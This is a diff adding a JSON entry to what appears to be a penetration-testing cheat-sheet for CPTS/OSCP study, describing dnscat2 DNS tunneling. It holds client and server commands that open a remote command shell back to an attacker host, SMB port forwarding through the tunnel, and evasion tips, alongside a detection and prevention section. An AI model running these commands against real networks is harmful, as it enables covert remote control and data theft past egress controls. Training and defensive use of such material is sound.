@@ -1,0 +1,132 @@
+{
+  "id": "dnscat2",
+  "name": "Dnscat2 - DNS Tunneling",
+  "command": "sudo ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=<domain> --no-cache",
+  "description": "Tunnels a command-and-control channel entirely inside DNS queries/responses, useful when only DNS egress is allowed. Run the dnscat2 server on the attack host, then start the PowerShell client on the Windows target with the server's pre-shared secret.",
+  "platform": "linux",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "dnscat2"
+  ],
+  "tags": [
+    "dnscat2",
+    "dns",
+    "tunnel",
+    "c2"
+  ],
+  "category": "Pivoting & Tunneling",
+  "subcategory": "DNS Tunneling",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 12: Pivoting, Tunneling, and Port Forwarding",
+  "examples": [
+    {
+      "label": "dnscat2",
+      "command": "sudo ruby dnscat2.rb --dns host=10.10.16.114,port=53,domain=inlanefreight.local --no-cache"
+    },
+    {
+      "label": "dnscat2",
+      "command": "Import-Module .\\dnscat2.ps1"
+    },
+    {
+      "label": "dnscat2",
+      "command": "Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd"
+    },
+    {
+      "label": "OSCP Ch19 — start dnscat2 server on Kali for a controlled DNS zone",
+      "command": "dnscat2-server <your_domain>"
+    },
+    {
+      "label": "OSCP Ch19 — start Linux dnscat2 client on compromised host",
+      "command": "./dnscat <your_domain>"
+    },
+    {
+      "label": "OSCP Ch19 — list active sessions and switch into session 1",
+      "command": "dnscat2> windows\ndnscat2> window -i 1"
+    },
+    {
+      "label": "OSCP Ch19 — dnscat2 port forward: tunnel local port to internal SMB (like ssh -L)",
+      "command": "command (<hostname>) 1> listen 127.0.0.1:4455 <internal_ip>:445"
+    },
+    {
+      "label": "OSCP Ch19 — verify DNS resolution to your zone (test exfil path)",
+      "command": "nslookup <test_label>.<your_domain>\nnslookup -type=txt <host>.<your_domain>"
+    },
+    {
+      "label": "OSCP Ch19 — check pivot's DNS resolver points to your zone's nameserver",
+      "command": "resolvectl status"
+    }
+  ],
+  "notes": "On the server, use 'window -i 1' to interact with a session. Match the PreSharedSecret to the server's startup output. Also covered in: OSCP PEN-200 Chapter 19 (Tunneling Through Deep Packet Inspection). OSCP Ch19: DNS tunneling works when only DNS egress is allowed (common in restricted networks/DPI environments). Workflow: (1) control an authoritative DNS zone (your domain or dnsmasq on a reachable IP); (2) the victim's resolver must forward to your NS — verify with resolvectl status and nslookup tests; (3) dnscat2-server (standalone binary) is the Kali-side listener; (4) ./dnscat <domain> (compiled Linux client) on the pivot connects back; (5) once a session is up, 'listen <local_ip>:<port> <internal_ip>:<port>' creates an SSH -L style port forward over the DNS tunnel. Verify SOCKS port appeared on Kali with ss -ntplu before proxychains use.",
+  "references": [
+    {
+      "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
+      "url": "https://academy.hackthebox.com/module/details/158"
+    },
+    {
+      "title": "dnscat2",
+      "url": "https://github.com/iagox86/dnscat2"
+    },
+    {
+      "title": "dnscat2-powershell",
+      "url": "https://github.com/lukebaggett/dnscat2-powershell"
+    },
+    {
+      "title": "OffSec PEN-200 - Tunneling Through Deep Packet Inspection",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "proxychains-run",
+      "note": "Tunnel tools over the DNS channel via proxychains.",
+      "rel": "next"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1572"
+  ],
+  "exam": "exam-ok",
+  "variations": [
+    {
+      "command": "./dnscat --secret=<secret> <domain>",
+      "caption": "Linux dnscat2 client: connect to server by domain",
+      "label": "dnscat"
+    },
+    {
+      "command": "./dnscat --dns server=<attacker_ip>,port=53 --secret=<secret>",
+      "caption": "Linux dnscat2 client: connect directly to server IP",
+      "label": "dnscat"
+    },
+    {
+      "command": "Import-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver <attacker_ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd",
+      "caption": "PowerShell dnscat2 client (Windows target)",
+      "label": "Import-Module"
+    }
+  ],
+  "defense": {
+    "why_it_works": "dnscat2 tunnels a command-and-control channel inside DNS queries/responses (encoded subdomains, TXT/NULL records), exfiltrating and controlling through a resolver even when only DNS egresses.",
+    "prerequisites": "A dnscat2 client on the target and DNS resolution that reaches the attacker's authoritative server (directly or recursively).",
+    "impact": "A covert C2/tunnel that works where only DNS is allowed out - control and data exfil past strict egress filtering.",
+    "detection": "[MITRE T1572] a high volume of DNS queries with long/encoded labels and unusual record types (TXT/NULL/CNAME) to one domain; high query entropy; a client resolving far more than baseline; DNS-tunneling signatures.",
+    "artifacts": "Anomalous DNS query volume/entropy to the attacker domain; the dnscat2 client process.",
+    "prevention": "[MITRE T1572 M1037 Filter Network Traffic] force internal clients through controlled resolvers and inspect DNS; [M1031] IDS/DNS-tunnel detection (entropy, volume, record-type analysis); block or sinkhole unknown authoritative domains.",
+    "evasion": "Low-and-slow queries, common record types, and a benign-looking domain reduce the tunneling signature; DNS-over-HTTPS further hides it.",
+    "sources": [
+      "HTB M12",
+      "MITRE T1572"
+    ],
+    "misconfiguration": "The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
+  }
+}
